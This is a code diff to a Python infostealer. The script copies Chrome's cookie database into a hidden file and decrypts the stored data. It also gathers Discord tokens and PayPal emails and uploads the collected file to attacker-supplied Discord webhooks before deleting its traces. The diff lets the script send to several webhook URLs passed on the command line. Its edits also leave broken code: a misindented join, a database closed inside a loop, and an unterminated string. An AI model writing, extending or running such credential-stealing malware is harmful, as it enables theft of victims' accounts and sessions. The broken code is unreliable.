@@ -1,23 +1,22 @@
 import json
 import os
+import sys
 from json import loads
 from base64 import b64decode
 from sqlite3 import connect
 from shutil import copyfile
-from threading import Thread
+from threading import Thread 
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from discord_webhook import DiscordWebhook
 from subprocess import Popen, PIPE
 from urllib.request import urlopen, Request
-from requests import get, post
-from random import randint
+from requests import get
 from re import findall, search
 import win32con
 from win32api import SetFileAttributes
 import browser_cookie3
-
-DISCORD_WEBHOOK_URL = "YOUR DISCORD WEBHOOK URL"
+import time
 
 website = ['discord.com', 'twitter.com', 'instagram.com']
 
@@ -76,14 +75,15 @@ def decrypt_data(data, key):
             return str(CryptUnprotectData(data, None, None, None, 0)[1])
         except:
             return ""
-def main():
+def main(DISCORD_WEBHOOK_URLs):
+    print(DISCORD_WEBHOOK_URLs)
     filename = "Cookies.db"
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
 
     if not os.path.isfile(filename):
         copyfile(db_path, filename)
-        SetFileAttributes(filename,win32con.FILE_ATTRIBUTE_HIDDEN)
+        SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
     db = connect(filename)
     db.text_factory = lambda b: b.decode(errors="ignore")
     cursor = db.cursor()
@@ -117,7 +117,6 @@ def main():
                 find_wb(j)
             for t in threads:
                 t.start()
-            for t in threads:
                 t.join()
             final_tokens = ''
             for n in tokens:
@@ -189,7 +188,7 @@ def main():
     except:
         pass
     with open(f"Cooked_data.txt", "a") as f:
-        SetFileAttributes('Cooked_data.txt',win32con.FILE_ATTRIBUTE_HIDDEN)
+        SetFileAttributes('Cooked_data.txt', win32con.FILE_ATTRIBUTE_HIDDEN)
         data = ''
         for r in result:
             data += f"{r}\n"
@@ -234,13 +233,14 @@ def main():
             elif all_data_p[m][1] == 2:
                 f.write(f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n")
                 discord_info_w(m, 2)
-    webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL, content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
-    with open("Cooked_data.txt", "rb") as f:
-        webhook.add_file(file=f.read(), filename='data.txt')
-    webhook.execute()
- 
-    db.commit()
-    db.close()
+    for URL in DISCORD_WEBHOOK_URLs:
+        webhook = DiscordWebhook(url=URL, content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
+        with open("Cooked_data.txt", "rb") as f:
+            webhook.add_file(file=f.read(), filename='data.txt')
+        webhook.execute()
+    
+        db.commit()
+        db.close()
     try:
         os.remove('Cookies.db')
         os.remove('Cooked_data.txt')
@@ -248,4 +248,8 @@ def main():
         pass
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) == 1:
+        main(['YOUR DISCORD WEBHOOK URL])
+    else:
+        del sys.argv[0]
+        main(sys.argv)
